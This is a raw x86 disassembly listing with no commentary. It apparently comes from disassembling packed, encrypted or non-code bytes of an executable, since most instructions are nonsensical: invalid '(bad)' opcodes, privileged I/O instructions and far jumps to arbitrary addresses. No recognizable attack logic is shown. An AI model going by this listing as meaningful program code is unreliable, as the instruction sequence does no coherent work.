  41d9c1:	sub    eax,0xc14f40ab
  41d9c6:	dec    edi
  41d9c7:	push   0xc419ad81
  41d9cc:	arpl   WORD PTR [edi],sp
  41d9ce:	add    esi,DWORD PTR [ebp-0x71b7cf88]
  41d9d4:	push   edi
  41d9d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d6:	xchg   ebx,eax
  41d9d7:	loop   0x41d9b9
  41d9d9:	pop    ecx
  41d9da:	jmp    0xbc7b94c6
  41d9df:	xchg   ebx,eax
  41d9e0:	mov    ch,0xb6
  41d9e2:	dec    esi
  41d9e3:	imul   ebx,edi,0x4abeaaf1
  41d9e9:	shl    BYTE PTR [ecx+0x6973c2d3],1
  41d9ef:	sbb    dh,BYTE PTR [ebx+0x53]
  41d9f2:	add    eax,0xb0a08b2
  41d9f7:	sti    
  41d9f8:	sbb    ah,BYTE PTR [edi+0x53]
  41d9fb:	mov    ds:0x3cb63f,al
  41da00:	mov    bh,0x60
  41da02:	rol    DWORD PTR ss:[eax],1
  41da05:	hlt    
  41da06:	das    
  41da07:	mov    cl,0x54
  41da09:	cmp    eax,0xb1918b9a
  41da0e:	pop    edx
  41da0f:	jp     0x41da03
  41da11:	sbb    BYTE PTR [edi],0x7a
  41da14:	sub    dh,BYTE PTR [esi-0x4d6553ca]
  41da1a:	or     al,0x55
  41da1c:	rcl    BYTE PTR [edi+0x23],cl
  41da1f:	or     DWORD PTR [ecx+eax*2+0x59],ebp
  41da23:	cmp    BYTE PTR [eax+0x4c],dh
  41da26:	mov    bl,0x6e
  41da28:	mov    ecx,0xeeb90ce
  41da2d:	push   eax
  41da2e:	mov    bl,0x7f
  41da30:	pop    eax
  41da31:	adc    al,0x98
  41da33:	fnsave [edx+eax*2+0x1b]
  41da37:	pop    edi
  41da38:	cmp    al,0x54
  41da3a:	sub    al,0x22
  41da3c:	call   FWORD PTR [ecx]
  41da3e:	inc    edx
  41da3f:	outs   dx,BYTE PTR ds:[esi]
  41da40:	arpl   WORD PTR [edx],di
  41da42:	pushf  
  41da43:	ret    0x83fc
  41da46:	lock jge 0x41da93
  41da49:	lods   eax,DWORD PTR ds:[esi]
  41da4a:	nop
  41da4b:	fstp   st(2)
  41da4d:	pop    esi
  41da4e:	or     al,0xf5
  41da50:	or     DWORD PTR [ebx],eax
  41da52:	dec    ebx
  41da53:	fst    QWORD PTR [edi]
  41da55:	pop    ecx
  41da56:	jns    0x41da91
  41da58:	sahf   
  41da59:	jge    0x41da91
  41da5b:	lods   al,BYTE PTR ds:[esi]
  41da5c:	xchg   edi,eax
  41da5d:	mov    ah,BYTE PTR [ebx+0x47]
  41da60:	fldcw  WORD PTR [ebx+0x64f4f39f]
  41da66:	add    DWORD PTR [esi+0x34],ebx
  41da69:	dec    ecx
  41da6a:	test   DWORD PTR [ebx+0x4ef72dc9],0x923a4904
  41da74:	push   ss
  41da75:	icebp  
  41da76:	jb     0x41dad2
  41da78:	push   ebx
  41da79:	cmp    eax,0x93913a5b
  41da7e:	xchg   ebx,eax
  41da7f:	fst    QWORD PTR [eax]
  41da81:	xchg   esi,eax
  41da82:	and    eax,0xfa422c13
  41da87:	mov    dh,0x82
  41da89:	sbb    al,0x57
  41da8b:	test   eax,0xa6c295c
  41da90:	sub    eax,0xf5e63b35
  41da95:	xchg   ebx,eax
  41da96:	inc    ebp
  41da97:	inc    edx
  41da98:	xchg   esi,eax
  41da99:	je     0x41da30
  41da9b:	sub    dh,BYTE PTR [edi-0x24]
  41da9e:	es mov bl,0x6c
  41daa1:	mov    DWORD PTR [esi-0x7a16bdb2],edi
  41daa7:	dec    eax
  41daa8:	jbe    0x41da8f
  41daaa:	add    al,0x17
  41daac:	inc    ebp
  41daad:	pop    esp
  41daae:	xor    cl,BYTE PTR [ebp+0x33ad7974]
  41dab4:	call   0x794f:0x210209f1
  41dabb:	pop    ebx
  41dabc:	lds    esp,FWORD PTR [esi]
  41dabe:	mov    ah,0x74
  41dac0:	test   DWORD PTR [ebx+0x32],0x4b251dcf
  41dac7:	bound  esp,QWORD PTR [edi+esi*2+0x719df02e]
  41dace:	cdq    
  41dacf:	pop    ecx
  41dad0:	add    DWORD PTR [edi-0x70],0x1604fd23
  41dad7:	push   eax
  41dad8:	sub    edi,esi
  41dada:	xchg   ecx,eax
  41dadb:	loop   0x41dafb
  41dadd:	ret    
  41dade:	cs fwait
  41dae0:	and    BYTE PTR [edx-0xe],ah
  41dae3:	lea    esp,[eax]
  41dae5:	icebp  
  41dae6:	mov    edx,0x6e0da2
  41daeb:	cld    
  41daec:	jg     0x41db60
  41daee:	outs   dx,DWORD PTR ds:[esi]
  41daef:	call   DWORD PTR [ebx]
  41daf1:	out    dx,al
  41daf2:	mov    ds:0x33955b38,eax
  41daf7:	mov    DWORD PTR [edi],ebx
  41daf9:	outs   dx,BYTE PTR ds:[esi]
  41dafa:	push   0x29
  41dafc:	mov    ch,0xc4
  41dafe:	jb     0x41daec
  41db00:	push   0x76c28180
  41db05:	jo     0x41dab8
  41db07:	cmp    al,0x87
  41db09:	mov    BYTE PTR [ebx-0x61],cl
  41db0c:	jg     0x41db51
  41db0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db0f:	je     0x41daa7
  41db11:	(bad)  
  41db12:	das    
  41db13:	mov    ds:0xb1a69eec,al
  41db18:	or     BYTE PTR [esi+esi*8+0x21a8344],bh
  41db1f:	jnp    0x41db59
  41db21:	fnstsw WORD PTR [eax-0x34]
  41db24:	ror    BYTE PTR [eax-0x21],0xce
  41db28:	sbb    edi,DWORD PTR [eax-0x1ad4d0ea]
  41db2e:	push   ebx
  41db2f:	fst    QWORD PTR [edx+eax*8-0x10543535]
  41db36:	out    0x9c,al
  41db38:	data16 fimul WORD PTR [ebp-0x7d]
  41db3c:	add    al,BYTE PTR [ebx-0x226a7b7a]
  41db42:	lahf   
  41db43:	or     cl,BYTE PTR [ebp-0x4]
  41db46:	stos   BYTE PTR es:[edi],al
  41db47:	lahf   
  41db48:	test   eax,0x9cc21426
  41db4d:	lods   al,BYTE PTR ds:[esi]
  41db4e:	fist   DWORD PTR [eax]
  41db50:	les    ebx,FWORD PTR [esi]
  41db52:	in     eax,0x0
  41db54:	xor    al,0xd5
  41db56:	mov    gs,WORD PTR [ebp-0x432a90f4]
  41db5c:	mov    bl,ah
  41db5e:	(bad)  
  41db5f:	jmp    0xc16a090d
  41db64:	(bad)  [edx-0x2b]
  41db67:	mov    edi,0x93d05553
  41db6c:	aad    0x6d
  41db6e:	cmc    
  41db6f:	retf   0x7b9a
  41db72:	mov    edx,0x87eaeede
  41db77:	jle    0x41dbf7
  41db79:	and    ebx,edx
  41db7b:	xchg   esi,eax
  41db7c:	xchg   edi,eax
  41db7d:	ret    
  41db7e:	xor    DWORD PTR [edi+0x3675e8c1],ebp
  41db84:	adc    dl,dl
  41db86:	pop    eax
  41db87:	jns    0x41db91
  41db89:	jmp    0x347a2660
  41db8e:	sahf   
  41db8f:	jl     0x41db50
  41db91:	push   ecx
  41db92:	dec    ebp
  41db93:	push   esp
  41db94:	or     eax,0x2027f098
  41db99:	jnp    0x41db88
  41db9b:	jae    0x41db5c
  41db9d:	scas   eax,DWORD PTR es:[edi]
  41db9e:	es mov ecx,0xd009b0ca
  41dba4:	mov    DWORD PTR [ebx+0x1c],eax
  41dba7:	call   0x9ea2:0x5a9e935d
  41dbae:	inc    edi
  41dbaf:	sub    ah,dh
  41dbb1:	push   esi
  41dbb2:	inc    ebx
  41dbb3:	sbb    al,0x2d
  41dbb5:	loop   0x41db92
  41dbb7:	gs dec ebx
  41dbb9:	sahf   
  41dbba:	jge    0x41db9f
  41dbbc:	shr    DWORD PTR [ecx-0x4b51d5d7],0xc6
  41dbc3:	dec    edi
  41dbc4:	ror    BYTE PTR [ecx-0x50438084],cl
  41dbca:	inc    esi
  41dbcb:	xchg   esp,eax
  41dbcc:	test   DWORD PTR [edx],edx
  41dbce:	icebp  
  41dbcf:	adc    BYTE PTR [esi+0x4b79c66],0x4
  41dbd6:	and    cl,ah
  41dbd8:	jecxz  0x41dbb5
  41dbda:	or     al,0xc5
  41dbdc:	xor    eax,DWORD PTR [edx+0x68e6d402]
  41dbe2:	ss in  al,dx
  41dbe4:	push   ss
  41dbe5:	jns    0x41db8a
  41dbe7:	leave  
  41dbe8:	cli    
  41dbe9:	les    edx,FWORD PTR [eax]
  41dbeb:	inc    ecx
  41dbec:	add    eax,0xeacd4980
  41dbf1:	cmp    eax,0x2dc3eeaf
  41dbf6:	call   0xde620296
  41dbfb:	sbb    ah,ch
  41dbfd:	test   al,0x12
  41dbff:	(bad)
  41dc02:	rol    DWORD PTR ds:0x25807fae,cl
  41dc08:	out    dx,eax
  41dc09:	test   al,0x7e
  41dc0b:	mov    bh,0x4a
  41dc0d:	(bad)  
  41dc0e:	imul   BYTE PTR [eax+0x44c750cc]
  41dc14:	test   eax,0xa94bc1c7
  41dc19:	sbb    eax,0x8975e457
  41dc1e:	imul   BYTE PTR [esi-0x5c6286ac]
  41dc24:	xor    BYTE PTR [edx],bl
  41dc26:	push   eax
  41dc27:	sahf   
  41dc28:	push   ecx
  41dc29:	imul   edi,DWORD PTR [ecx-0x6c7907c3],0xffffffde
  41dc30:	xlat   BYTE PTR ds:[ebx]
  41dc31:	imul   ebx,DWORD PTR [ecx+0x77d69fe4],0x42f2ba2a
  41dc3b:	retw   0xba32
  41dc3f:	xor    al,0x4
  41dc41:	sbb    bl,dl
  41dc43:	or     al,0xb2
  41dc45:	js     0x41dc23
  41dc47:	sbb    al,0xd9
  41dc49:	mov    dh,0x7e
  41dc4b:	push   ebx
  41dc4c:	xchg   esp,eax
  41dc4d:	call   0x3caf7749
  41dc52:	inc    esp
  41dc53:	mov    ecx,0x3604ed53
  41dc58:	push   cs
  41dc59:	mov    BYTE PTR [edx+0x3c],ah
  41dc5c:	jbe    0x41dcbb
  41dc5e:	sub    DWORD PTR ds:0xc216c54a,eax
  41dc64:	mov    ebx,0x91ba7450
  41dc69:	ret    
  41dc6a:	add    eax,0xa4918add
  41dc6f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41dc71:	mov    al,ds:0x4b3018b4
  41dc76:	or     DWORD PTR [esi+0x74],0x78
  41dc7a:	into   
  41dc7b:	js     0x41dcf4
  41dc7d:	test   BYTE PTR [esi],bl
  41dc7f:	pop    ecx
  41dc80:	in     al,dx
  41dc81:	pop    esi
  41dc82:	cld    
  41dc83:	cld    
  41dc84:	cmp    eax,0x8bf480ee
  41dc89:	pusha  
  41dc8a:	std    
  41dc8b:	gs cdq 
  41dc8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc8e:	cmp    al,BYTE PTR [ecx]
  41dc90:	pop    es
  41dc91:	xor    esi,esi
  41dc93:	mov    dl,0x19
  41dc95:	rcl    BYTE PTR [edi],0xac
  41dc98:	ret    0x8160
  41dc9b:	pop    ecx
  41dc9c:	pushf  
  41dc9d:	inc    esi
  41dc9e:	mov    dl,0xfb
  41dca0:	add    ecx,DWORD PTR [ebx-0x64e29ee1]
  41dca6:	aas    
  41dca7:	jecxz  0x41dcd4
  41dca9:	ret    0xff63
  41dcac:	jbe    0x27429ce3
  41dcb2:	retf   
  41dcb3:	adc    ebp,0xffffffd4
  41dcb6:	stos   BYTE PTR es:[edi],al
  41dcb7:	into   
  41dcb8:	dec    ebp
  41dcb9:	inc    BYTE PTR [esi-0x3dd9014a]
  41dcbf:	jmp    0x41dc7c
  41dcc1:	pop    ebx
  41dcc2:	fdivr  QWORD PTR [ecx]
  41dcc4:	dec    cx
  41dcc6:	or     DWORD PTR [eax-0x1e],ebp
  41dcc9:	iret   
  41dcca:	and    DWORD PTR [edx+0x18],edx
  41dccd:	mov    edx,0x1e532552
  41dcd2:	(bad)  
  41dcd3:	nop
  41dcd4:	xor    cl,BYTE PTR [edx]
  41dcd6:	mov    DWORD PTR [ecx+ecx*1],ebp
  41dcd9:	cmp    eax,0x3e9e204a
  41dcde:	(bad)  
  41dcdf:	or     DWORD PTR [ebx-0x14],esp
  41dce2:	pushf  
  41dce3:	shl    BYTE PTR [ebp+ebp*1-0x58],1
  41dce7:	sti    
  41dce8:	shr    BYTE PTR [ebx-0xa7902fa],1
  41dcee:	inc    ecx
  41dcef:	jnp    0x41dcf0
  41dcf1:	clc    
  41dcf2:	xor    ecx,edx
  41dcf4:	call   0x4b02:0xb98f4f89
  41dcfb:	jmp    0x41dd5e
  41dcfd:	mov    esp,0xcb36a404
  41dd02:	and    ch,BYTE PTR [eax+edi*2-0x61]
  41dd06:	and    edi,ebx
  41dd08:	and    DWORD PTR [eax+0x6c],0x1e01d0df
  41dd0f:	xchg   edi,eax
  41dd10:	aaa    
  41dd11:	ret    
  41dd12:	iret   
  41dd13:	push   es
  41dd14:	fdiv   DWORD PTR [ebx-0x688c5276]
  41dd1a:	jmp    FWORD PTR [edi+0x39]
  41dd1d:	jg     0x41dd2e
  41dd1f:	cmc    
  41dd20:	ss jmp 0x41dcc2
  41dd23:	add    eax,0xdbd9b563
  41dd28:	mov    ch,0xa
  41dd2a:	mov    cl,0x45
  41dd2c:	push   es
  41dd2d:	push   eax
  41dd2e:	mov    cl,0x9c
  41dd30:	outs   dx,DWORD PTR ds:[esi]
  41dd31:	cmp    al,0x61
  41dd33:	pop    edx
  41dd34:	mov    ecx,0xa81c4b5a
  41dd3a:	or     ch,cl
  41dd3c:	icebp  
  41dd3d:	add    al,BYTE PTR [esi+0x197d1221]
  41dd43:	pop    eax
  41dd44:	jne    0x41dd8a
  41dd46:	jecxz  0x41dd77
  41dd48:	(bad)  
  41dd49:	repnz sti 
  41dd4b:	sub    eax,0xed6fe8ce
  41dd50:	gs aaa 
  41dd52:	mov    bh,0x4e
  41dd54:	dec    esp
  41dd55:	pop    ss
  41dd56:	fs shr bl,1
  41dd59:	jle    0x41dd05
  41dd5b:	xchg   edx,eax
  41dd5c:	vsubss xmm7,xmm7,xmm0
  41dd60:	mov    WORD PTR [ebp+0x74],fs
  41dd63:	jge    0x41dd36
  41dd65:	push   ecx
  41dd66:	push   es
  41dd67:	mov    bh,BYTE PTR [ebp+ebx*2+0x76]
  41dd6b:	ins    DWORD PTR es:[edi],dx
  41dd6c:	test   cl,al
  41dd6e:	or     DWORD PTR ds:0x6e3ad276,edx
  41dd74:	jmp    FWORD PTR [ecx]
  41dd76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd77:	pop    esi
  41dd78:	push   eax
  41dd79:	and    al,0x10
  41dd7b:	sub    DWORD PTR [edi+0xda25a8a],ebp
  41dd81:	in     al,dx
  41dd82:	int3   
  41dd83:	out    0x7e,al
  41dd85:	ss icebp 
  41dd87:	cmp    edi,DWORD PTR [ebx-0x297db196]
  41dd8d:	gs sub eax,0x38f3e737
  41dd93:	jmp    0xe95bc0a4
  41dd98:	push   ss
  41dd99:	xchg   esp,eax
  41dd9a:	imul   edi,DWORD PTR [edi],0x10503e23
  41dda0:	cmp    al,0x9e
  41dda2:	xchg   ebx,ebx
  41dda4:	xor    al,0x58
  41dda6:	les    ecx,FWORD PTR [ebx+0xa]
  41dda9:	dec    esi
  41ddaa:	push   ebx
  41ddab:	js     0x41dd6e
  41ddad:	in     eax,dx
  41ddae:	mov    ds:0x935cf195,al
  41ddb3:	mov    ah,ch
  41ddb5:	or     eax,DWORD PTR [eax+0x223fb894]
  41ddbb:	dec    esi
  41ddbc:	loop   0x41de34
  41ddbe:	pop    edi
  41ddbf:	add    eax,0xbb6aec52
  41ddc4:	das    
  41ddc5:	fsubr  QWORD PTR [eax+0x635906e5]
  41ddcb:	dec    edx
  41ddcc:	mov    cl,0xec
  41ddce:	lods   al,BYTE PTR ds:[esi]
  41ddcf:	inc    edx
  41ddd0:	push   esp
  41ddd1:	fcomp  DWORD PTR [eax]
  41ddd3:	test   esp,esp
  41ddd5:	dec    ecx
  41ddd6:	je     0x41de4d
  41ddd8:	mov    dl,0x62
  41ddda:	xor    eax,0xba756ad8
  41dddf:	stos   BYTE PTR es:[edi],al
  41dde0:	cld    
  41dde1:	dec    ebx
  41dde2:	adc    eax,0x4d786496
  41dde7:	adc    DWORD PTR [ebx+0x20],esi
  41ddea:	lds    esi,FWORD PTR [ebx]
  41ddec:	jg     0x41dd7b
  41ddee:	mov    ah,0xe3
  41ddf0:	and    eax,0x593ad483
  41ddf5:	gs scas eax,DWORD PTR es:[edi]
  41ddf7:	ja     0x41de5b
  41ddf9:	lods   eax,DWORD PTR ds:[esi]
  41ddfa:	fcomp  DWORD PTR [ebx-0x28]
  41ddfd:	psubusw mm2,QWORD PTR [eax+0x23d02a3c]
  41de04:	out    0x2d,eax
  41de06:	adc    eax,0xe98b78ef
  41de0b:	mov    esi,0xb84e7701
  41de10:	dec    esp
  41de11:	jg     0x41dda1
  41de13:	and    DWORD PTR [esi-0x19],esp
  41de16:	enter  0x4fa5,0xf5
  41de1a:	inc    esi
  41de1b:	mov    ch,0xc0
  41de1d:	push   edi
  41de1e:	jecxz  0x41dde5
  41de20:	enter  0x6080,0xe9
  41de24:	and    eax,0xd68bbba9
  41de29:	sbb    ebx,DWORD PTR [esi]
  41de2b:	lods   eax,DWORD PTR ds:[esi]
  41de2c:	pop    ebx
  41de2d:	pop    edx
  41de2e:	daa    
  41de2f:	inc    eax
  41de30:	popa   
  41de31:	push   eax
  41de32:	pop    ebp
  41de33:	pop    ebp
  41de34:	std    
  41de35:	mov    edx,0xb9cf5b37
  41de3a:	jge    0x41de11
  41de3c:	push   ds
  41de3d:	and    cl,BYTE PTR [edx+0x0]
  41de40:	nop    DWORD PTR [edi]
  41de43:	inc    eax
  41de44:	jmp    esp
  41de46:	cmp    eax,0x1134a4a1
  41de4b:	das    
  41de4c:	inc    esp
  41de4d:	xchg   edi,eax
  41de4e:	fisub  DWORD PTR [esi]
  41de50:	dec    ebp
  41de51:	sub    eax,ecx
  41de53:	imul   ecx,DWORD PTR [ebp+0x17],0x90df7d00
  41de5a:	xlat   BYTE PTR ds:[ebx]
  41de5b:	outs   dx,BYTE PTR ds:[esi]
  41de5c:	push   eax
  41de5d:	cmp    ecx,DWORD PTR [eax]
  41de5f:	push   ds
  41de60:	scas   al,BYTE PTR es:[edi]
  41de61:	enter  0x9c38,0x67
  41de65:	ins    DWORD PTR es:[edi],dx
  41de66:	out    dx,eax
  41de67:	stos   BYTE PTR es:[edi],al
  41de68:	xchg   edi,eax
  41de69:	arpl   WORD PTR [eax],di
  41de6b:	je     0x41ddf1
  41de6d:	xchg   ebx,eax
  41de6e:	sub    ah,BYTE PTR [edi+ebp*2-0x36815e87]
  41de75:	xor    DWORD PTR ds:0x2c52f664,esi
  41de7b:	sbb    eax,0x50b28950
  41de80:	stos   DWORD PTR es:[edi],eax
  41de81:	pushf  
  41de82:	mov    dh,0x41
  41de84:	out    0x9,al
  41de86:	push   cs
  41de87:	sub    BYTE PTR [edi+0x693dc14d],ch
  41de8d:	push   0xfcabae6e
  41de92:	add    BYTE PTR [eax+0x50f17fa6],ah
  41de98:	dec    eax
  41de9a:	sbb    edx,DWORD PTR [eax+ebx*2+0xe]
  41de9e:	push   eax
  41de9f:	cli    
  41dea0:	cs sbb al,0x71
  41dea3:	stc    
  41dea4:	test   BYTE PTR [ebx+0x49],al
  41dea7:	mov    al,0xbd
  41dea9:	call   0xf9517dc5
  41deae:	bound  edi,QWORD PTR [edi+0x238c5f1a]
  41deb4:	xlat   BYTE PTR ds:[ebx]
  41deb5:	popa   
  41deb6:	and    al,ch
  41deb8:	dec    eax
  41deb9:	fs xor dl,bl
  41debc:	popa   
  41debd:	sub    cl,dl
  41debf:	push   0xffffffe5
  41dec1:	in     eax,dx
  41dec2:	retf   
  41dec3:	dec    eax
  41dec4:	jmp    0xe7198e68
  41dec9:	rcr    BYTE PTR [ebx-0x73],1
  41decc:	ja     0x41dee8
  41dece:	clc    
  41decf:	sub    bh,dl
  41ded1:	aas    
  41ded2:	cmp    DWORD PTR [edx+0x5a2b568d],ecx
  41ded8:	sub    eax,0x7d5b67b
  41dedd:	fmul   QWORD PTR [esi+0x30]
  41dee0:	push   cs
  41dee1:	rol    DWORD PTR [ecx-0x229233af],cl
  41dee7:	dec    ecx
  41dee8:	xor    DWORD PTR [esi+0x7b],esi
  41deeb:	pop    edi
  41deec:	in     al,0xe3
  41deee:	fsubr  QWORD PTR [esi+ebx*2]
  41def1:	ret    
  41def2:	ret    
  41def3:	push   edx
  41def4:	adc    al,0xb4
  41def6:	mov    es,WORD PTR [edi]
  41def8:	sbb    ecx,DWORD PTR [esi]
  41defa:	xor    BYTE PTR [edx],0xc
  41defd:	cs aad 0x75
  41df00:	jb     0x41dec3
  41df02:	(bad)  [edx+ebp*1]
  41df05:	lds    edx,FWORD PTR [edx]
  41df07:	js     0x41df80
  41df09:	sub    al,0xa9
  41df0b:	in     eax,0xaf
  41df0d:	arpl   WORD PTR [ecx],sp
  41df0f:	mov    DWORD PTR [edx-0x23],edi
  41df12:	mov    edx,0x8950b79e
  41df17:	xor    al,0x22
  41df19:	xchg   ebp,eax
  41df1a:	add    al,0xa2
  41df1c:	cli    
  41df1d:	dec    eax
  41df1e:	jne    0x41df63
  41df20:	mov    dl,0x82
  41df22:	adc    edi,ebp
  41df24:	inc    edx
  41df25:	rcr    BYTE PTR ss:[ebx+0x197154e1],0x7b
  41df2d:	lea    ebp,[esi]
  41df2f:	bnd cs jle 0x41df5f
  41df33:	and    esp,DWORD PTR [ebp+0x3645d577]
  41df39:	push   cs
  41df3a:	sub    ah,dl
  41df3c:	je     0x41df05
  41df3e:	xchg   edx,eax
  41df3f:	jle    0x41decc
  41df41:	jge    0x41df7b
  41df43:	aaa    
  41df44:	js     0x41deda
  41df46:	or     al,0x21
  41df48:	jae    0x41dfa5
  41df4a:	or     eax,0x94564c63
  41df4f:	out    0x2a,al
  41df51:	mov    ebp,0x7abb5408
  41df56:	les    edi,FWORD PTR [ebx-0x62]
  41df59:	out    0x48,al
  41df5b:	dec    edx
  41df5c:	adc    dh,dh
  41df5e:	xchg   ebp,eax
  41df5f:	cmc    
  41df60:	loopne 0x41df14
  41df62:	jb     0x41dfac
  41df64:	clc    
  41df65:	xchg   ebp,eax
  41df66:	test   eax,0x534d8091
  41df6b:	mov    edx,0x23a05389
  41df70:	sti    
  41df71:	dec    esp
  41df72:	inc    ebp
  41df73:	cwde   
  41df74:	fld    TBYTE PTR [ecx]
  41df76:	push   es
  41df77:	push   0x40
  41df79:	das    
  41df7a:	daa    
  41df7b:	loope  0x41df2c
  41df7d:	adc    BYTE PTR [esi-0x23666988],bh
  41df83:	push   edi
  41df84:	mov    cs,WORD PTR [esi-0x1a]
  41df87:	pusha  
  41df88:	sbb    cl,dl
  41df8a:	sub    DWORD PTR [edx+0x2e],ecx
  41df8d:	sbb    BYTE PTR [ecx],0xa8
  41df90:	outs   dx,BYTE PTR ds:[esi]
  41df91:	add    ebp,DWORD PTR [edi]
  41df93:	nop
  41df94:	sub    DWORD PTR [esp+edx*4+0x16],eax
  41df98:	rcr    DWORD PTR [edi+eiz*8],cl
  41df9b:	ins    BYTE PTR es:[edi],dx
  41df9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df9d:	push   ds
  41df9e:	mov    esi,0x4ba1d2af
  41dfa3:	stos   DWORD PTR es:[edi],eax
  41dfa4:	fld    QWORD PTR [ecx-0x3e]
  41dfa7:	or     ebp,DWORD PTR [edx+0x4]
  41dfaa:	add    bh,BYTE PTR [ebp+0x7c]
  41dfad:	inc    DWORD PTR [esi+0x49a0ff2]
  41dfb3:	pop    ss
  41dfb4:	repnz fucomp st(1)
  41dfb7:	push   ecx
  41dfb8:	std    
  41dfb9:	jp     0x41df42
  41dfbb:	loope  0x41df6c
  41dfbd:	sahf   
  41dfbe:	dec    ebp
  41dfbf:	dec    ecx
  41dfc0:	(bad)  
  41dfc1:	mov    ds:0xc574dd03,al
  41dfc6:	cli    
  41dfc7:	(bad)  
  41dfc8:	bound  eax,QWORD PTR [edx-0x1ab13cf1]
  41dfce:	test   al,0x83
  41dfd0:	pop    ecx
  41dfd1:	dec    ebx
  41dfd2:	sti    
  41dfd3:	mov    ?,ecx
  41dfd5:	xor    DWORD PTR [edx-0x33],edx
  41dfd8:	sub    BYTE PTR [esi],bl
  41dfda:	mov    eax,ds:0x552391ad
  41dfdf:	jmp    0x87c9:0x1a8e531e
  41dfe6:	xor    eax,0xd33cc2
  41dfeb:	jecxz  0x41e034
  41dfed:	sbb    eax,0xd8eddfd9
  41dff2:	push   ss
  41dff3:	add    DWORD PTR [esi-0x80],esi
  41dff6:	cld    
  41dff7:	pop    ebx
  41dff8:	std    
  41dff9:	rcl    DWORD PTR cs:[edx+0x15],1
  41dffd:	xlat   BYTE PTR ds:[ebx]
  41dffe:	stos   BYTE PTR es:[edi],al
  41dfff:	pop    eax
  41e000:	or     al,0xce
  41e002:	jp     0x41e066
  41e004:	or     dl,BYTE PTR [edx]
  41e006:	mov    ebx,0xd7ec10b1
  41e00b:	jb     0x41e026
  41e00d:	and    esi,DWORD PTR [esi]
  41e00f:	(bad)  
  41e010:	mov    ecx,0x84a8922d
  41e015:	cmp    edi,DWORD PTR [ecx-0x77418865]
  41e01b:	add    edx,esp
  41e01d:	cmp    al,0x2f
  41e01f:	aad    0x69
  41e021:	push   edi
  41e022:	mov    eax,ds:0x9688d4e1
  41e027:	push   ebp
  41e028:	mov    ah,BYTE PTR [ecx+0x9b863dd]
  41e02e:	sahf   
  41e02f:	jp     0x41dfbb
  41e031:	fs cs into 
  41e034:	push   0xffffffb0
  41e036:	fist   DWORD PTR [eax+0x51588532]
  41e03c:	jp     0x41e055
  41e03e:	mov    eax,ds:0x44b4d7ea
  41e043:	clc    
  41e044:	call   0x29c8:0xd98ceef3
  41e04b:	mov    al,0x2a
  41e04d:	cli    
  41e04e:	jne    0x41e0c6
  41e050:	jmp    0x41e030
  41e052:	and    esp,DWORD PTR [edx]
  41e054:	sbb    ah,BYTE PTR [ecx]
  41e056:	jmp    0x632c7014
  41e05b:	jo     0x41e0a4
  41e05d:	sub    DWORD PTR ds:0x4d5f3e92,esp
  41e063:	aam    0xc8
  41e065:	leave  
  41e066:	pop    ss
  41e067:	shl    BYTE PTR [ebx-0x6275e552],cl
  41e06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06e:	and    BYTE PTR [edx],0x4e
  41e071:	(bad)  
  41e072:	cmp    ebp,DWORD PTR [eax]
  41e074:	dec    eax
  41e075:	cmp    eax,0xcc243b35
  41e07a:	shl    BYTE PTR [ecx+0x52],0x85
  41e07e:	add    ch,BYTE PTR [ebp+0x69]
  41e081:	test   al,0xa4
  41e083:	jne    0x41e0e5
  41e085:	out    0xe8,al
  41e087:	ins    DWORD PTR es:[edi],dx
  41e088:	loope  0x41e081
  41e08a:	mov    edi,DWORD PTR [esi+0x671a4878]
  41e090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e091:	shl    BYTE PTR [edx],0x5b
  41e094:	mov    edx,0xcfee756b
  41e099:	les    eax,FWORD PTR [ebp-0x3e7d4e87]
  41e09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a0:	pop    esi
  41e0a1:	fcomp  QWORD PTR [esi+0x30617302]
  41e0a7:	pushw  ss
  41e0a9:	mov    ebx,0x394d13ee
  41e0ae:	adc    BYTE PTR [edi+eiz*1+0x75b8fd9b],al
  41e0b5:	icebp  
  41e0b6:	jns    0x41e129
  41e0b8:	jb     0x41e044
  41e0ba:	in     eax,dx
  41e0bb:	jbe    0x41e083
  41e0bd:	or     DWORD PTR [edx-0x35af783b],0xfffffffb
  41e0c4:	fnsave [edx]
  41e0c6:	pop    eax
  41e0c7:	xor    eax,ecx
  41e0c9:	idiv   bl
  41e0cb:	dec    eax
  41e0cc:	lods   al,BYTE PTR ds:[esi]
  41e0cd:	add    ah,BYTE PTR [esi-0x70]
  41e0d0:	jne    0x41e10d
  41e0d2:	aam    0xa8
  41e0d4:	sub    BYTE PTR [ebx],al
  41e0d6:	call   0xce80b89c
  41e0db:	std    
  41e0dc:	sbb    DWORD PTR [edx],ebx
  41e0de:	jge    0x41e062
  41e0e0:	and    al,0x23
  41e0e2:	jo     0x41e0b3
  41e0e4:	ss ds sbb eax,esi
  41e0e8:	es fwait
  41e0ea:	sbb    ecx,0x4d94c377
  41e0f0:	mov    bl,0x59
  41e0f2:	cmp    DWORD PTR [esi-0xa7c53d6],esp
  41e0f8:	cmp    bl,BYTE PTR [ecx]
  41e0fa:	push   edx
  41e0fb:	and    dl,al
  41e0fd:	outs   dx,DWORD PTR ds:[esi]
  41e0fe:	mov    ds:0x366b7380,eax
  41e103:	pop    edx
  41e104:	push   ecx
  41e105:	(bad)  
  41e106:	xor    bh,BYTE PTR [ebx+ebp*4-0x2f]
  41e10a:	sub    bh,BYTE PTR [edx+eax*2+0x3f]
  41e10e:	and    al,0xef
  41e110:	xchg   ecx,eax
  41e111:	jne    0x41e0cf
  41e113:	test   BYTE PTR [esi+edx*4],cl
  41e116:	mov    eax,ds:0xaec4207f
  41e11b:	scas   eax,DWORD PTR es:[edi]
  41e11c:	sbb    al,BYTE PTR [eax-0x58]
  41e11f:	sub    ah,bl
  41e121:	mov    esi,0x560e9a5c
  41e126:	fimul  DWORD PTR [esi-0x78]
  41e129:	lods   al,BYTE PTR ds:[esi]
  41e12a:	aad    0x99
  41e12c:	pop    ebp
  41e12d:	test   BYTE PTR [esi-0x24e7993e],ah
  41e133:	retf   0x3314
  41e136:	pop    ecx
  41e137:	adc    BYTE PTR [esp+ecx*4],al
  41e13a:	jae    0x41e119
  41e13c:	lods   al,BYTE PTR ds:[esi]
